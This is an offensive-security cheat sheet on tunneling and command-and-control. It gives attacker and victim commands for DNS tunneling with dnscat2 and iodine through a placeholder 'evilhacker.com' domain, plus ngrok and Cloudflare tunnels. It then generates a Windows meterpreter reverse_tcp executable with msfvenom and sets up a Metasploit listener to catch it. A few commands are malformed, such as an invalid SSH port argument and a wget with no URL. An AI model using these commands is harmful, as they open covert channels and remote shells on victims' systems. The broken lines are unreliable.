---
title: tunneling
tags: [tunneling-and-exfiltration, type/cheatsheet, phase/c2, platform/network]
---

# Tunneling

## SOCKS

## SSH Tunneling

### Create a Tunnel

```
ssh -nNT -f -L 808080 ubuntu@192.168.1.151
```

### Kill the SSH Tunnel

```
ps aux | grep ssh

kill <pid>
```

## TCP/UDP Tunneling

## DNS Tunneling

### Dnscat2

```
# Attacker
sudo dnscat2-server --dns domain=evilhacker.com

# Victim
dnscat2 --dns domain=evilhacker.com
```

#### Commands

```
# Attacker
window -i 1

help
```

### Iodine

```
# Attacker
sudo iodined 192.168.100.1 evilhacker.com -P password1

# Client (Not allowed to access internet)
# Creating a layer 3 vpn tunnel
sudo iodine evilhacker.com -P password1

sudo route add -net 0.0.0.0/0 gw 192.168.100.1 dns0

# now ping using the client machine
ping google.com

SUCCESS!
```

## CloudFlare Tunnel

### Download Cloudflared Tool

```
wget 
```

### Install Cloudflared Tool

```
sudo dpkg -i cloudflared-linux-amd64.deb
```

### Start Local Web Server

```
sudo service apache2 start
```

### Run Cloudflared

```
cloudflared --url localhost
```

Visit the given URL

## Ngrok - Port Forwarding

### Install Ngrok

**Sign up and download for linux**

```
cd Downloads
	
mv ngrok-stable-linux-amd64.tgz /home/kali/Desktop
	
tar -xvf ngrok-stable-linux-amd64.tgz
	
./ngrok authtoken <auth token>
	
./ngrok help
	
./ngrok tcp 5555
```

#### Find the IP Address

```
host 0.tcp.ngrok.io
```

This IP address will be used as a locahost in payload creation

### Simple Payload

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ngrok ip> LPORT=<ngrok port> -f exe -o shell.exe
```

### Set Up Listener

```
msfconsole

use exploit/multi/handler

set payload windows/x64/meterpreter/reverse_tcp

set LHOST 0.0.0.0   //means we are listening to any incoming connection

set LPORT 5555

run
```
